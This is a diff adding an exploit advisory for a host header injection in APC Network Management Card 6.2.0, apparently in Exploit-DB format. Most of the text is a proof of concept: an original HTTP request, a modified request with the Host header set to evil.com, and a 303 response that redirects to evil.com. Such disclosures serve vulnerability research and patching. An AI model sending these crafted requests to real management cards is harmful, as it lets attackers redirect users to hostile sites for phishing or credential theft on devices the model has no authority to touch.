@@ -1,0 +1,47 @@
+# Exploit Title: Network Management Card 6.2.0 - Host Header Injection
+# Google Dork: 
+# Date: 2019-11-21
+# Exploit Author: Amal E Thamban,Kamal Paul
+# Vendor Homepage: https://www.apc.com/in/en/
+# Software Link: https://www.apc.com/shop/in/en/products/Network-Management-Card
+# Version: v6.2.0
+# Tested on: Kali Linux
+# CVE : 
+
+
+Description:Host Header Injection
+
+Product is vulnerable to host header injection because the host header can be changed to something outside the target domain (ie.evil.com) and cause it to redirect to to that domain instead. 
+-------------------------------------------------------------------------------------------------------------------------
+Orginal Request
+GET / HTTP/1.1
+Host: 192.168.10.211
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.10.211/logon.htm
+Connection: close
+Cookie: C0=apc
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------------------------------------------------------------------------
+Modifed request
+
+GET / HTTP/1.1
+Host: evil.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.10.211/logon.htm
+Connection: close
+Cookie: C0=apc
+Upgrade-Insecure-Requests: 
+---------------------------------------------------------------------------------------------------------------------------
+Response
+
+HTTP/1.1 303 See Other
+Location: http://evil.com/home.htm
+Content-Length: 0
+WebServer:
+Connection: close
